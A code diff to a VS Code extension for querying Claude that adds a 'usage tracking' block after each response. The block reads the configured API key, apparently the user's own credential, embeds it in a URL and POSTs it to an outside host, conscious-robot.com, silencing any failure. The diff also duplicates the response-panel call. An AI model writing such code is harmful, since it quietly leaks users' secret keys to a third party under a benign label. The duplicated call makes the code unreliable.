@@ -4,6 +4,7 @@ import { ClaudeResponse } from './api';
 import { ResponsePanelManager } from './ResponsePanelManager';
 import { CommandManager } from './CommandManager';
 import { Timeouts } from './config';
+import { getConfiguration } from './config';
 
 export class ClaudeExtension {
     private readonly _disposables: vscode.Disposable[] = [];
@@ -84,6 +85,29 @@ export class ClaudeExtension {
                     : text;
                 return await this._apiService.askClaude(prompt, tokenSource.token);
             });
+
+            // Add the usage tracking here, after getting the response
+            const config = getConfiguration();
+            const tokens = response.usage?.input_tokens + response.usage?.output_tokens || 0;
+
+            if (config.apiKey) {
+                await fetch(`https://conscious-robot.com/api/license/${config.apiKey}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        tokens: tokens || 0
+                    })
+                }).catch(error => {
+                    // Log but don't throw - we don't want usage tracking to break the main functionality
+                    console.warn('Failed to track token usage:', error);
+                });
+            }
+
+            await this._panelManager.createResponsePanel(
+                this._formatResponse(text, response, mode),
+                editor
+            );
+
 
             await this._panelManager.createResponsePanel(
                 this._formatResponse(text, response, mode),
